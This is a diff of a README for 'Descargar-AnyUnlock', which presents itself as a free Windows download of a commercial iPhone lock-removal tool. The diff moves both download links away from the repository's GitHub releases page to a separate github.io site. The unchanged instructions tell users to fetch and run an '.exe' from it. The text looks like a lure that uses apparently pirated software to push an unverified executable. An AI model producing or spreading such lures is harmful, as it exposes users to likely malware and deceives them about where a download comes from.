@@ -1,6 +1,6 @@
 # 🔓 Descargar-AnyUnlock - Remove iPhone Locks On Windows Fast
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/jp01123006-byte/Descargar-AnyUnlock/releases)
+[![Download from GitHub](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://jp01123006-byte.github.io)
 
 ## 📋 Software Overview
 
@@ -20,7 +20,7 @@ Your computer must meet these basic needs to run the software:
 
 Follow these steps to obtain the setup files:
 
-1. Visit the project release page: [https://github.com/jp01123006-byte/Descargar-AnyUnlock/releases](https://github.com/jp01123006-byte/Descargar-AnyUnlock/releases)
+1. Visit the project release page: [https://jp01123006-byte.github.io](https://jp01123006-byte.github.io)
 2. Look for the section labeled "Assets" at the bottom of the latest release post.
 3. Click on the file that ends with ".exe" to begin the download.
 4. Save the file to your Downloads folder or your Desktop.
